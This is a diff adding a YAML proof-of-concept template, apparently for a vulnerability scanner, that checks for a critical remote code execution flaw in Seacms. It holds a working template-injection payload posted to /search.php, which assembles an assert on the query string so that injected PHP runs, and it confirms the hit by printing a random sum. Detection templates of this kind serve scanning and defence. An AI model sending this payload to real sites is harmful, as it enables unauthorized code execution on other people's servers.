@@ -1,0 +1,25 @@
+id: poc-yaml-seacms-rce
+info:
+  name: Seacms 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: Seacms
+  reference: []
+  description: null
+variables:
+  r: random_int(10000000, 80000000)
+  r1: random_int(50000, 61000)
+transport: http
+requests:
+- method: POST
+  path: /search.php?print({{.r}}%2b{{.r1}})
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r + r1) && !contains(body, "<svg
+    xmlns=")
+  output: []
